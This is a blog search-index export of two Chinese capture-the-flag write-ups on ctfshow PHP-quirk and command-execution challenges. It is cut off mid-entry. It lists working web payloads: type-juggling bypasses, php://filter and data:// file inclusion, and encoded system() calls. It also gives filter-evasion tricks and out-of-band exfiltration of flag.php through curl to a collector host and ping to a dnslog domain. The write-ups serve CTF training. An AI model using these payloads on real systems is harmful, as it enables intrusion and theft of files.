<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP特性</title>
    <url>/2022/06/14/PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<p>PHP特性</p>
<span id="more"></span>

<h3 id="89"><a href="#89" class="headerlink" title="89"></a>89</h3><p>提示：通过数组绕过<br>解答：输入 &#x2F;?num[]&#x3D;1 看到flag<br>###90<br>提示:因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num&#x3D;4476%23<br>分析:get方式传入num，如果num&#x3D;&#x3D;&#x3D;4476就die，然后intval判断num<br>解答:输入?num&#x3D;4476%23 可以看到flag<br>###91<br>提示:考查正则表达式是匹配方法,可以通过 %0a 绕过 payload： abc%0aphp<br>分析:这里主要的突破点就是&#x2F;m，我们可以看到第一个preg_match()函数，有个&#x2F;m，而第二个正则则没有，我们可以利用换行进行绕过<br>解答输入&#x2F;?cmd&#x3D;abc%0aphp 可以看到flag(%0a是换行的意思)</p>
<h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><p>提示:intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。<br>所以为了绕过前面的&#x3D;&#x3D;4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以<br>分析:90属于强类型比较（ &#x3D;&#x3D;&#x3D; ） 92属于弱类型（ &#x3D;&#x3D; ）在若比较中（&#x3D;&#x3D;），4476a与4476相等。<br>解答:输入&#x2F;?num&#x3D;0x117c 可以得到flag</p>
<h3 id="93"><a href="#93" class="headerlink" title="93"></a>93</h3><p>提示:过滤了字母但是我们可以使用其他进制就是计算 0b?? : 二进制0??? : 八进制 0X?? : 16进制 payload ： ?num&#x3D;010574<br>分析:过滤了字母，十六进制弄不了，那就改八进制<br>解答:输入?num&#x3D;010574</p>
<h3 id="94"><a href="#94" class="headerlink" title="94"></a>94</h3><p>提示:在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num&#x3D;4476.0<br>分析:对于strpos()函数，我们可以利用换行进行绕过（%0a）payload:?num&#x3D;%0a010574<br>也可以小数点绕过payload：?num&#x3D;4476.0<br>因为intval()函数只读取整数部分还可以八进制绕过(%20是空格的url编码形式)<br>解答:输入?num&#x3D;4476.0</p>
<h3 id="95"><a href="#95" class="headerlink" title="95"></a>95</h3><p>提示:可以通过8进制绕过但是前面必须多加一个字节 ?num&#x3D;+010574或者?num&#x3D;%2b010574<br>分析:又增加过滤了<br>解答:输入?num&#x3D;%2b010574</p>
<h3 id="96"><a href="#96" class="headerlink" title="96"></a>96</h3><p>提示:在linux下面表示当前目录是 .&#x2F; 所以我们的payload： u&#x3D;.&#x2F;flag.php<br>解答:输入??u&#x3D;.&#x2F;flag.php</p>
<h3 id="97"><a href="#97" class="headerlink" title="97"></a>97</h3><p>提示:通过数组绕过 a[]&#x3D;1&amp;b[]&#x3D;2<br>分析:md5强比较，数组绕过<br>解答:post输入a[]&#x3D;1&amp;b[]&#x3D;2</p>
<h3 id="100"><a href="#100" class="headerlink" title="100"></a>100</h3><p>提示:这道题基本上没有对参数进行过滤,所以直接执行命令<br>?v1&#x3D;21&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;<br>分析:v1要为数字，v2是指令，v3必须含;<br>解答:输入?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;</p>
<h3 id="101"><a href="#101" class="headerlink" title="101"></a>101</h3><p>提示:?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;替换0x2d为-,最后一位需要爆破16次，题目给的flag少一位<br>分析:这题过滤了&#x2F;,*等，所以只能用反射类解，少一位进行爆破<br>解答:输入?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p>
<h3 id="102"><a href="#102" class="headerlink" title="102"></a>102</h3><p>提示:GET<br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br>POST v1&#x3D;hex2bin<br>访问1.php后查看源代码获得flag<br>分析:这里要求v2是数字，并且截取第三位后的字符作为call_user_func的第二个参数。<br>解答:get v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php post: v1&#x3D;hex2bin<br>之后再访问1.php,查看源码</p>
<h3 id="103"><a href="#103" class="headerlink" title="103"></a>103</h3><p>提示:GET<br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br>POST，v1&#x3D;hex2bin<br>访问1.php后查看源代码获得flag<br>解答:get v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php post: v1&#x3D;hex2bin<br>之后再访问1.php,查看源码</p>
<h3 id="104"><a href="#104" class="headerlink" title="104"></a>104</h3><p>提示:payload:aaK1STfY<br>0e76658526655756207688271159624026011393<br>aaO8zKZF<br>0e89257456677279068558073954252716165668<br>分析:sha1()函数无法处理数组类型，将报错并返回false,sha1()函数的弱相等<br>解答:get,?v2&#x3D;a;post,v1&#x3D;a</p>
<h3 id="105"><a href="#105" class="headerlink" title="105"></a>105</h3><p>提示:php的变量覆盖 payload： GET: ?suces&#x3D;flag POST: error&#x3D;suces<br>分析:变量覆盖<br>解答:get传参,?suces&#x3D;flag;post传参,error&#x3D;suces</p>
<h3 id="106"><a href="#106" class="headerlink" title="106"></a>106</h3><p>分析:sha1弱比较;aaroZmOk;aaK1STfY;aaO8zKZF;aa3OFF9m<br>解答:get传参,?v2&#x3D;aaroZmOk;post传参,v1&#x3D;aa3OFF9m</p>
<h3 id="107"><a href="#107" class="headerlink" title="107"></a>107</h3><p>提示:GET: ?v3&#x3D;240610708 POST: v1&#x3D;flag&#x3D;0<br>分析:v1&#x3D;v2&#x3D;flag&#x3D;md5 v3<br>parse_str — 将字符串解析成多个变量,如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。<br>解答::get传参?v3&#x3D;QNKCDZO;post传参,v1&#x3D;flag&#x3D;0</p>
<h3 id="108"><a href="#108" class="headerlink" title="108"></a>108</h3><p>提示:ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。<br>搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>?c&#x3D;a%00778<br>分析:ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配<br>0x36d的十进制为877，strrev是反转字符串，778<br>解答:输入?c&#x3D;a%00778</p>
<h3 id="109"><a href="#109" class="headerlink" title="109"></a>109</h3><p>提示:Exception 异常处理类 <a href="http://c.biancheng.net/view/6253.html">http://c.biancheng.net/view/6253.html</a> payload:<br>?v1&#x3D;Exception&amp;v2&#x3D;system(‘cat fl36dg.txt’) ?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(‘cat fl36dg.txt’)<br>分析:先来看下这个正则表达式&#x2F;[a-zA-Z]+&#x2F; 匹配至少有一个字母的字符串<br>所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。<br>解答:1.?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(‘ls’)<br>2.?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(‘ls’)</p>
<h3 id="110"><a href="#110" class="headerlink" title="110"></a>110</h3><p>提示:php内置类 利用 FilesystemIterator 获取指定目录下的所有文件<br>getcwd()函数 获取当前工作目录 返回当前工作目录 payload: ?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd<br>分析:FilesystemIterator获取目录文件,getcwd()函数取得当前工作目录<br>解答:输入?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd 之后访问fl36dga.txt</p>
<h3 id="112"><a href="#112" class="headerlink" title="112"></a>112</h3><p>提示:php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php<br>分析:is_file()函数检查指定的文件名是否是正常的文件。<br>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。<br>解答:可以直接用不带任何过滤器的filter伪协议file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
<h3 id="113"><a href="#113" class="headerlink" title="113"></a>113</h3><p>示:&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;p<br>roc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;pro<br>c&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;<br>self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;se<br>lf&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>分析:1.可以使用压缩过滤器绕过<br>2.显示的内容是根目录下的内容多次重复后绕过is_file。<br>解答:1.输入?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<br>2.?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root<br>&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self<br>&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc<br>&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
<h3 id="114"><a href="#114" class="headerlink" title="114"></a>114</h3><p>提示:payload: php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>解答:输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
<h3 id="115"><a href="#115" class="headerlink" title="115"></a>115</h3><p>提示:payload:num?%0c36,%0c&#x3D;&#x3D;\f<br>分析:发现除了±.号以外还有只剩下%0c也就是换页符了<br>解答:输入?num&#x3D;%0C36</p>
<h3 id="123"><a href="#123" class="headerlink" title="123"></a>123</h3><p>提示:POST: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag<br>分析:PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . 转换为_<br>但是有一个特性可以绕过,使变量名出现.之类的<br>特殊字符[, GET或POST方式传参时,变量名中的也会被替换为_,但其后的字符就不会被替换了<br>解答:get传参,?$fl0g&#x3D;flag_give_me;;post传参,CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;eval($a[0])</p>
<h3 id="125"><a href="#125" class="headerlink" title="125"></a>125</h3><p>提示:GET:?1&#x3D;flag.php POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])<br>解答:GET传参,?1&#x3D;flag.php;POST传参,CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])<br>###126<br>提示:1.GET:?a&#x3D;1+fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])<br>2.GET:?$fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])<br>解答:GET传参,?a&#x3D;1+fl0g&#x3D;flag_give_me;POST传参CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p>
<h3 id="127"><a href="#127" class="headerlink" title="127"></a>127</h3><p>提示:GET:?ctf show&#x3D;ilove36d<br>分析:过滤了_,用空格绕过waf<br>解答:get传参:?ctf show&#x3D;ilove36d</p>
<h3 id="128"><a href="#128" class="headerlink" title="128"></a>128</h3><p>提示: <em>()是一个函数<br><em>()&#x3D;&#x3D;gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll<br>get_defined_vars()函数<br>get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag<br>payload: ?f1&#x3D;</em>&amp;f2&#x3D;get_defined_vars<br>分析:第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数<br>解答:输入?f1&#x3D;</em>&amp;f2&#x3D;get_defined_vars</p>
<h3 id="129"><a href="#129" class="headerlink" title="129"></a>129</h3><p>提示: 目录穿越<br>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写） payload: &#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 查看源代码获得 flag<br>分析:构造的f中有ctfshow则执行readfile函数，同时还要不影响flag.php的读取<br>解答:get传参:?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
<h3 id="130"><a href="#130" class="headerlink" title="130"></a>130</h3><p>提示:直接绕过正则表达式： f&#x3D;ctfshow<br>解答:post:f&#x3D;ctfshow</p>
<h3 id="131"><a href="#131" class="headerlink" title="131"></a>131</h3><p>提示:正则表达式是溢出 <a href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a> 大概意思就是在php中正则表达式进行匹配有一定的限制，超过限制直接返回false<br>解答:post:f&#x3D;ctfshow</p>
<h3 id="132"><a href="#132" class="headerlink" title="132"></a>132</h3><p>提示: php中&amp;&amp;和||运算符应用 访问&#x2F;robots.txt,之后访问&#x2F;admin，获得源代码 <a href="https://www.cnblogs.com/hurry-up/p/10220082.html">https://www.cnblogs.com/hurry-up/p/10220082.html</a><br> 对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，<br>不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 payload: ?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin<br>分析:访问&#x2F;admin&#x2F;即可进入源码界面;只需$username &#x3D;&#x3D;&#x3D;”admin”成立了即可同时code&#x3D;admin<br>解答:输入?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin</p>
<h3 id="133"><a href="#133" class="headerlink" title="133"></a>133</h3><p>提示:<a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a><br>分析:禁止了命令执行的函数，并且没有写入权限<br>解答:反弹shell 或者curl外带 或者盲注这里的话反弹没有成功，但是可以外带。<br>payload: curl -X POST -F xx&#x3D;@flag.php <a href="http://xxx;curl/">http://xxx；curl</a> -F 将flag文件上传到Burp的 Collaborator Client </p>
<h3 id="134"><a href="#134" class="headerlink" title="134"></a>134</h3><p>提示:php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。<br> 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。<br>所以payload: ?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d<br>分析:POST数组的覆盖<br>解答:输入?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</p>
<h3 id="135"><a href="#135" class="headerlink" title="135"></a>135</h3><p>提示:<code>$F</code>;+ping <code>cat flag.php|awk &#39;NR==2&#39;</code>.6x1sys.dnslog.cn<br>#通过ping命令去带出数据，然后awk NR一排一排的获得数据<br>分析:Linux中的cp命令<br>解答:先将flag写入1.txt;&#x2F;?F&#x3D;<code>$F</code>; cp flag.php 1.txt<br>再访问1.txt;&#x2F;1.txt</p>
<h3 id="136"><a href="#136" class="headerlink" title="136"></a>136</h3><p>提示:payload: ls &#x2F;|tee 1 访问1下载发现根目录下有flag payload: cat &#x2F;f149_15_h3r3|tee 2 访问下载就OK<br>分析:tee file1 file2 &#x2F;&#x2F;复制文件<br>ls|tee 1.txt &#x2F;&#x2F;命令输出<br>解答:?c&#x3D;ls |tee 1;&#x2F;&#x2F;将根目录下的内容写入1<br>访问1，下载文件发现f149_15_h3r3;?c&#x3D;nl &#x2F;f149_15_h3r3|tee 1<br>访问1，下载文件得flag</p>
<h3 id="137"><a href="#137" class="headerlink" title="137"></a>137</h3><p>提示:call_user_func()函数的使用 payload: POST: ctfshow&#x3D;ctfshow::getFlag<br>分析:payload: POST: ctfshow&#x3D;ctfshow::getFlag<br>解答:POST传参：ctfshow&#x3D;ctfshow::getFlag</p>
<h3 id="138"><a href="#138" class="headerlink" title="138"></a>138</h3><p>提示:POST: ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag<br>分析:运用了call_user_func()函数<br>解答:POST传参：ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</p>
<h3 id="140"><a href="#140" class="headerlink" title="140"></a>140</h3><p>提示: 函数的利用 payload: f1&#x3D;usleep&amp;f2&#x3D;usleep<br>分析:弱比较函数调用<br>可以看到只要我们让intval($code)为0就可以了<br>intval会将非数字字符转换为0，也就是说intval(‘a’)&#x3D;&#x3D;0 intval(‘.’)&#x3D;&#x3D;0intval(‘&#x2F;‘)&#x3D;&#x3D;0<br>解答:POST传参：f1&#x3D;md5&amp;f2&#x3D;md5</p>
<h3 id="141"><a href="#141" class="headerlink" title="141"></a>141</h3><p>提示:考察命令执行和绕过return 应该说运算符都可以绕过 这里用羽师傅给的一个脚本取反命令执行<br>?v1&#x3D;10&amp;v2&#x3D;0&amp;v3&#x3D;-(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);<br>分析:&#x2F;^\W+$&#x2F; 作用是匹配非数字字母下划线的字符<br>解答:输入?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)-&amp;v2&#x3D;1</p>
<h3 id="142"><a href="#142" class="headerlink" title="142"></a>142</h3><p>提示:0和0x0绕过 这里绕过因为是因为当成了8进制和16进制<br>解答:输入?v1&#x3D;0</p>
<h3 id="143"><a href="#143" class="headerlink" title="143"></a>143</h3><p>提示:位运算都可以进行构造字符 ?v1&#x3D;10&amp;v2&#x3D;0&amp;v3&#x3D;<em>(“%0c%19%0c%5c%60%60”^”%7f%60%7f%28%05%0d”) (“%0e%0c%00%00”^”%60%60%20%2a”)?&gt;<br>解答:输入 ?v1&#x3D;10&amp;v2&#x3D;0&amp;v3&#x3D;</em>(“%0c%19%0c%5c%60%60”^”%7f%60%7f%28%05%0d”) (“%0e%0c%00%00”^”%60%60%20%2a”)?&gt;</p>
<h3 id="144"><a href="#144" class="headerlink" title="144"></a>144</h3><p>提示:?v1&#x3D;10&amp;v2&#x3D;(%8c%86%8c%8b%9a%92)(%9c%9e%8b%df%99%d5);&amp;v3&#x3D;-<br>解答:输入?v1&#x3D;1<br>&amp;v2&#x3D;-(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%0c%01%07%01%0f%08%0f”^”%7f%60%60%20%60%60%60%60%2f%7f%60%7f”)<br>&amp;v3&#x3D;1</p>
<h3 id="145"><a href="#145" class="headerlink" title="145"></a>145</h3><p>提示:?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):<br>分析:三目运算符<br>解答:输入?v1&#x3D;1&amp;v3&#x3D;|(<del>%8C%86%8C%8B%9A%92)(</del>%9C%9E%8B%DF%99%D5)|&amp;v2&#x3D;1</p>
<h3 id="146"><a href="#146" class="headerlink" title="146"></a>146</h3><p>提示:?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5)|<br>解答:输入?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5)|</p>
<h3 id="147"><a href="#147" class="headerlink" title="147"></a>147</h3><p>提示:php里默认命名空间是\，所有原生函数和类都在这个命名空间中。<br>普通调用一个函数,如果直接写函数名function_name()调用,调用的时候其实相当于写了一个相对路径;<br>而如果写\function_name()这样调用函数;则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类,就必须写绝对路径这种写法<br>解答:GET传参 ?show&#x3D;}system(“cat f*”);&#x2F;*<br>POST传参 ctf&#x3D;\create_function</p>
<h3 id="148"><a href="#148" class="headerlink" title="148"></a>148</h3><p>提示:payload ?code&#x3D;(“%0c%19%0c%5c%60%60”^”%7f%60%7f%28%05%0d”) (“%09%01%03%01%06%02”^”%7d%60%60%21%60%28”);<br>预期解是使用中文 ?code&#x3D;$哈&#x3D;”</p>
]]></content>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2022/06/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p> 命令执行</p>
<span id="more"></span>

<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><p>分析代码： if(!preg_match(“&#x2F;flag&#x2F;i”, $c))<br>preg_match 函数用于执行一个正则表达式匹配。&#x2F;i意味着不分大小写。本句含义是不能用flag值且忽略了大小写。从这句可以看出过滤了flag。<br>解答：传入 ?c&#x3D;echo ‘’?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 在使用base64解码。<br>&#x2F;&#x2F;空格过滤:<br>%09 符号需要php环境<br>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg&#x3D;$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)<br>cat过滤：<br>more:一页一页的显示档案内容<br>less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）<br>&#x2F;&#x2F;</p>
<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><p>分析代码：if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |’|<code>|echo|;|(/i”, $c)) 过滤了flag,system,php,cat,sort,shell,echo,分号，空格，单引号，括号，空格 解答：尝试include”/etc/passwd”?&gt;可以执行，且代码没有过滤$，用c=include”$_POST[x]”?&gt;或者c=include”$_GET[x]”?&gt;然后用php伪协议将include包含的文件在页面上显示出来 payload：?c=include”$_GET[url]”?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php 在使用base64解码。 ###33-36（解答一样） 分析代码： if(!preg_match(“/flag|system|php|cat|sort|shell|.| |&#39;|</code>|echo|;|(|”&#x2F;i”, $c))<br>过滤了flag,system,php,cat,sort,shell,echo,分号，单引号，双引号，空格，括号还有单双引号<br>解答：用php伪协议将include包含的文件在页面上显示出来<br>payload：?c&#x3D;include”$_GET[url]”?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php 在使用base64解码。<br>###37<br>分析代码： if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){ include($c);<br>过滤了flag ，又是 include 文件包含<br>解答：1.flag使用绕过 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 查看源码<br>2.利用伪协议读flag ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D; 查看源代码。<br>###38<br>分析代码: if(!preg_match(“&#x2F;flag|php|file&#x2F;i”, $c)){ include($c);<br>过滤了flag和php ，又是 include 文件包含<br>解答: 利用伪协议读flag查看源码<br>###39<br>分析代码: if(!preg_match(“&#x2F;flag&#x2F;i”, $c)){ include($c.”.php”);<br>过滤了flag,限制了.php后缀<br>解答：我们可以试试伪协议，因为不能带有flag，所以filter协议和php:&#x2F;&#x2F;input也不好用了。data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用<br>flag使用绕过：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain, 查看源码<br>###40<br>分析代码：过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取，正则中的括号不是英文的 是过滤了中文的括号<br>解答：show_source(next(array_reverse(scandir(pos(localeconv()))))); GXYCTF的禁止套娃 通过cookie获得参数进行命令执行<br>c&#x3D;session_start();system(session_id()); passid&#x3D;ls<br>###41<br>分析代码：这个题过滤了$、+、-、^使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。<br>我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。<br>解答：使用脚本<br>###42<br>分析代码： system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1主要意思是不进行回显的意思，可参考Shell脚本<br>解答：我们要让命令回显，那么进行命令分隔即可 可构造playload:cat flag.php 查看源代码<br>###43<br>分析代码：if(!preg_match(“&#x2F;;|cat&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了cat和分号<br>解答：可以构造playload:?c&#x3D;nl flag.php|| 查看源代码<br>&#x2F;&#x2F;payload有很多:<br>?c&#x3D;more flag.php||<br>?c&#x3D;sort flag.php||<br>?c&#x3D;less flag.php||<br>?c&#x3D;tac flag.php||<br>?c&#x3D;tail flag.php||<br>?c&#x3D;nl flag.php||<br>?c&#x3D;strings flag.php||<br>&#x2F;&#x2F;<br>###44<br>分析代码：if(!preg_match(“&#x2F;;|cat|flag&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了cat，flag和分号<br>解答：构造playload:?c&#x3D;more ????.???|| ?c&#x3D;more fla*.php|| ?c&#x3D;more fl\ag.php|| ?c&#x3D;more fl’’ag.php|| 查看源代码<br>###45<br>分析代码： if(!preg_match(“&#x2F;;|cat|flag| &#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了空格，cat，flag和分号<br>解答：构造playload：?c&#x3D;more%09fla*.php|| 查看源代码<br>###46<br>分析代码：if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|$|<em>&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>过滤了空格，cat，flag和分号增加了过滤数字￥</em><br>解答：构造playload：?c&#x3D;more%09????.???|| 查看源代码 空格可用%09 （不属于数字）<br>###47-49（基本一样）<br>分析代码： if(!preg_match(“&#x2F;;|cat|flag| |[0-9]|$|<em>|more|less|head|sort|tail&#x2F;i”, $c)){ system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”); }<br>多过滤了一些内容<br>解答：构造playload：?c&#x3D;tac%09????.???|| 查看源代码<br>###50<br>分析:%09被过滤<br>解答：使用&lt;&gt;代替空格&lt;&gt;和?同时使用不回显 所以用\代替？构造playload：<br>?c&#x3D;tac&lt;&gt;fla\g.php|| 查看源代码<br>###51<br>分析:tac被过滤了<br>解答：构造playload: 